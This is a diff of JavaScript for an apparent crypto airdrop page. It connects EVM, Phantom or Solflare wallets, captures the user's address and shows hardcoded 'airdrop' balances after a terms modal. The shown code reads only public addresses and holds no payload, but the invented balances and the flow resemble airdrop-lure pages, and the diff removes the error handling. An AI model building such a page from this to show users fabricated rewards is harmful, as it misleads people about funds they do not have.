@@ -1,4 +1,4 @@
-// --------------------- ELEMENTS ---------------------
+// ELEMENTS
 const landingSection = document.getElementById("landingSection");
 const connectSection = document.getElementById("connectSection");
 const solanaSection = document.getElementById("solanaSection");
@@ -11,31 +11,24 @@ const termsModal = document.getElementById("termsModal");
 const acceptBtn = document.getElementById("acceptBtn");
 const airdropPage = document.getElementById("airdropPage");
 
-// Wallet modal elements
-const walletChoiceModal = document.getElementById("walletChoiceModal");
-const evmWalletBtn = document.getElementById("evmWalletBtn");
-const phantomWalletBtn = document.getElementById("phantomWalletBtn");
-const solflareWalletBtn = document.getElementById("solflareWalletBtn");
-const cancelWalletBtn = document.getElementById("cancelWalletBtn");
-
-// --------------------- USER DATA ---------------------
+// User Data
 const userWalletAddress = "YourWalletHere";
 const userAirdropBalance = 500;
 const previousBalance = 300;
 
-// --------------------- STEP 1: Proceed ---------------------
+// Step 1
 proceedBtn.addEventListener("click", () => {
   landingSection.classList.add("hidden");
   connectSection.classList.remove("hidden");
 });
 
-// --------------------- STEP 2: Connect Wallet ---------------------
+// Step 2
 connectBtn.addEventListener("click", () => {
   connectSection.classList.add("hidden");
   walletChoiceModal.classList.remove("hidden");
 });
 
-// --------------------- STEP 3: Input Solana Address ---------------------
+// Step 3
 solInput.addEventListener("input", () => {
   const percent = Math.min((solInput.value.length / 44) * 100, 100);
   progressFill.style.width = percent + "%";
@@ -44,12 +37,12 @@ solInput.addEventListener("input", () => {
     : submitSol.classList.add("hidden");
 });
 
-// --------------------- STEP 4: Submit Solana ---------------------
+// Step 4
 submitSol.addEventListener("click", () => {
   if (solInput.value.trim()) termsModal.classList.remove("hidden");
 });
 
-// --------------------- STEP 5: Accept Terms ---------------------
+// Step 5
 acceptBtn.addEventListener("click", () => {
   termsModal.classList.add("hidden");
   solanaSection.classList.add("hidden");
@@ -63,57 +56,61 @@ acceptBtn.addEventListener("click", () => {
   document.getElementById("balanceDiffSection").classList.remove("hidden");
 
   airdropPage.classList.remove("hidden");
+  setTimeout(() => airdropPage.classList.add("show"), 50);
 });
 
-// --------------------- CANCEL WALLET MODAL ---------------------
-cancelWalletBtn.onclick = () => walletChoiceModal.classList.add("hidden");
+// -------- Wallet Integration --------
+const walletChoiceModal = document.getElementById("walletChoiceModal");
+const evmWalletBtn = document.getElementById("evmWalletBtn");
+const phantomWalletBtn = document.getElementById("phantomWalletBtn");
+const solflareWalletBtn = document.getElementById("solflareWalletBtn");
+const cancelWalletBtn = document.getElementById("cancelWalletBtn");
 
-// --------------------- WALLET CONNECT ---------------------
+// ---------- WalletConnect v2 / Web3Modal v2 setup ----------
+const projectId = "YOUR_WALLETCONNECT_PROJECT_ID"; // <---- Put your v2 Project ID here
 
-// ✅ Insert your WalletConnect v2 Project ID here
-const projectId = "85d1310d55b14854c6d62bab3b779200"; 
+// Ethereum chains config
+const chains = [
+  {
+    id: 1,
+    name: "Ethereum",
+    network: "mainnet",
+    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+    rpcUrls: { default: "https://rpc.ankr.com/eth" }
+  }
+];
 
-// EVM / WalletConnect v2 initialization
+// Initialize Ethereum client for v2
 const ethereumClient = new window.Web3ModalEthereum.EthereumClient(
-  window.Web3ModalEthereum.wagmiConfig({
-    chains: [
-      {
-        id: 1,
-        name: "Ethereum",
-        network: "mainnet",
-        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
-        rpcUrls: { default: "https://rpc.ankr.com/eth" }
-      }
-    ],
-    projectId
-  }),
-  [{ id: 1 }]
+  window.Web3ModalEthereum.wagmiConfig({ chains, projectId }),
+  chains
 );
 
+// Initialize Web3Modal v2
 const web3Modal = new window.Web3ModalHTML.Web3Modal(
-  { projectId, walletImages: {}, themeMode: "dark" },
+  { projectId, themeMode: "dark" },
   ethereumClient
 );
 
-// --------------------- EVM WALLET ---------------------
+// ---------- Wallet button events ----------
+cancelWalletBtn.onclick = () => walletChoiceModal.classList.add("hidden");
+
+// EVM Wallet
 evmWalletBtn.onclick = async () => {
   walletChoiceModal.classList.add("hidden");
 
-  try {
-    await web3Modal.openModal();
-    const provider = await ethereumClient.getProvider();
-    const ethersProvider = new ethers.providers.Web3Provider(provider);
-    const signer = ethersProvider.getSigner();
-    solInput.value = await signer.getAddress();
-    solanaSection.classList.remove("hidden");
-    submitSol.classList.remove("hidden");
-  } catch (err) {
-    console.error(err);
-    alert("EVM Wallet connection failed. Check your wallet or network.");
-  }
+  await web3Modal.openModal();
+
+  const provider = await ethereumClient.getProvider();
+  const ethersProvider = new ethers.providers.Web3Provider(provider);
+  const signer = ethersProvider.getSigner();
+
+  solInput.value = await signer.getAddress();
+  solanaSection.classList.remove("hidden");
+  submitSol.classList.remove("hidden");
 };
 
-// --------------------- PHANTOM WALLET ---------------------
+// Phantom Wallet (v2 compatible)
 phantomWalletBtn.onclick = async () => {
   walletChoiceModal.classList.add("hidden");
 
@@ -123,39 +120,28 @@ phantomWalletBtn.onclick = async () => {
     return;
   }
 
-  try {
-    const res = await provider.connect();
-    solInput.value = res.publicKey.toString();
-    solanaSection.classList.remove("hidden");
-    submitSol.classList.remove("hidden");
-  } catch (err) {
-    console.error(err);
-    alert("Phantom connection failed.");
-  }
+  const res = await provider.connect({ onlyIfTrusted: false });
+  solInput.value = res.publicKey.toString();
+  solanaSection.classList.remove("hidden");
+  submitSol.classList.remove("hidden");
 };
 
-// --------------------- SOLFLARE WALLET ---------------------
+// Solflare Wallet (v2 + injection compatible)
 solflareWalletBtn.onclick = async () => {
   walletChoiceModal.classList.add("hidden");
 
-  let solflareProvider = window.solflare || (window.Solflare ? new window.Solflare() : null);
+  let solflareProvider = window.solflare;
+  if (!solflareProvider && window.Solflare) {
+    solflareProvider = new window.Solflare();
+  }
 
   if (!solflareProvider) {
     alert("Solflare Wallet not detected. Use Solflare browser.");
     return;
   }
 
-  try {
-    await solflareProvider.connect();
-    solInput.value = solflareProvider.publicKey.toString();
-    solanaSection.classList.remove("hidden");
-    submitSol.classList.remove("hidden");
-  } catch (err) {
-    console.error(err);
-    alert("Solflare connection failed.");
-  }
-};  await solflare.connect();
-  solInput.value = solflare.publicKey.toString();
+  await solflareProvider.connect();
+  solInput.value = solflareProvider.publicKey.toString();
   solanaSection.classList.remove("hidden");
   submitSol.classList.remove("hidden");
 };
